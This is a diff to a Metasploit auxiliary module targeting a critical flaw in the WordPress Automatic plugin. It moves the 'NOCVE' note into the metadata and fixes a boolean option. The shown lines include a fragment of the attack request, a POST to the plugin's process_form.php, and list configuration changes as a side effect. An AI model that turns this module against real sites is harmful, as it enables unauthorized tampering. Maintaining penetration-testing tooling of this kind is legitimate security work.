@@ -31,13 +31,13 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [['WordPress', {}]],
         'DefaultTarget' => 0,
         'References' => [
-          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/'],
-          ['NOCVE', 'Patched in 3.53.3 without vendor disclosure']
+          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/']
         ],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
+          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],
+          'NOCVE' => ['Patched in 3.53.3 without vendor disclosure']
         }
       )
     )
@@ -72,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-automatic', 'process_form.php'),
       'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },
       'vars_post' => { key => value },
-      'keep_cookies' => 'true'
+      'keep_cookies' => true
     })
     fail_with(Failure::Unreachable, 'Site not responding') unless res
     res && res.code == 200 && res.body.include?('{"status":"success"}')
